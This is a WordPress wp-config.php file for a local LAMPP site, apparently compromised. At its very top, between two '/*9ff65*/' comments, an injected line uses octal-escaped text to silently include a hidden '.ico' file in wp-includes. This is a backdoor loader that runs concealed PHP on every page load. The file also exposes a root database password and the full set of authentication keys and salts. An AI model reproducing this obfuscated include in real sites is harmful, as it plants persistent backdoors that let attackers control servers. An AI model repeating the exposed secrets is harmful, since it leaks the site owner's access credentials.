<?php
/*9ff65*/

@include "\057opt\057lam\160p/h\164doc\163/wp\055inc\154ude\163/Re\161ues\164s/.\066d00\060101\056ico";

/*9ff65*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'PW_DATAPPYME');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'andres');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '&]:&5o*J1oC.72cp3^`rTW Mk}aBFR|(=g4,v,)MGA<[B1*J/Fp&7^sx0i+-9S-B');
define('SECURE_AUTH_KEY',  'JM01B(UA0cj#1kk@EHTta51|n;&4oL5*I*>RZyXEl#v!^6uMNTAYbojh+C|D3&- ');
define('LOGGED_IN_KEY',    '%C>W;?ZTxNj^Y;qzf4{,uAB2mN@vR]3TpmOBv>P^/H!5#N:&$a=Z2WwK/H$;C5xC');
define('NONCE_KEY',        'F~)!;s jIssW/L@XQn2Y63i9Q;xa61!aH,HUh}TITPYf^8<yqYAoapn!/-_2bP;g');
define('AUTH_SALT',        'uys~e+/L%SPQQ;B01<:28N4np[-|Dz$,IUfZ{9B7kOWDE.MJAPIPO)RJ,o?bGVb?');
define('SECURE_AUTH_SALT', 'u.o]es/# /Uj?^lJu;oy_8,4YW(U/[Zfb?W:e*R5%;A/4w}nWdH=O>*m-v8PXT1<');
define('LOGGED_IN_SALT',   'b8sFODJ*DEtfa<6fTN!t>:iU_az9640%;9%{[4 Uiq1+xyc&DK:c{ak#8QK[N+B,');
define('NONCE_SALT',       'eD@o#%>uyF@OschDMnH`wMbuGM*YEh^-Uzy=,2+@S<8b&VdY+:DPP^=)k+_~zVB2');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
define('FS_METHOD','direct');
